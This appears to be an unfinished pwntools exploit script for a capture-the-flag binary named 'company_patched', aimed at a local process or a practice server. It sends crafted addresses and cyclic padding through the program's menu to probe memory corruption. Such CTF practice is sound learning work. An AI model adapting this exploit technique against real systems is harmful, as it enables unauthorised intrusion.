#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("company_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

local = True 
if local:
    p = process("./company_patched")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./company_patched', checksec=False)


def name(data):
    p.sendafter(b'name?', data)
def add(idx, name, pos, sal):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'Index:', str(idx))
    p.sendafter(b'Name:', name)
    p.sendafter(b'Position:', pos)
    p.sendlineafter(b'Salary:', str(sal))

name(p64(0x404060)*4)
add(0, cyclic(0x10), b'HR', 100)
p.interactive()
#0x4040a0